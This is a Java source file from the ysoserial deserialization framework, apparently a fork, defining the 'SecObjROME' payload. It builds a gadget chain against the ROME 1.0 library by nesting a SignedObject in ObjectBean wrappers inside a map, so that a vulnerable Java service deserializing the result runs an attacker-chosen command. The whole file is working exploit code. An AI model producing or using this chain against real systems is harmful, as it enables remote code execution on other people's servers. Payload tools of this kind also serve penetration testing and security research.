package ysoserial.payloads;

import com.sun.syndication.feed.impl.ObjectBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import java.io.Serializable;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.List;

import static ysoserial.payloads.util.Gadgets.createSignedObject;
import static ysoserial.payloads.util.Gadgets.getTargetPayload;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies("rome:rome:1.0")
@Authors({ Authors.J1an })
public class SecObjROME extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
        SignedObject signedObject = createSignedObject(command);
        ObjectBean delegate = new ObjectBean(SignedObject.class, signedObject);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(SecObjROME.class, args);
	}
}
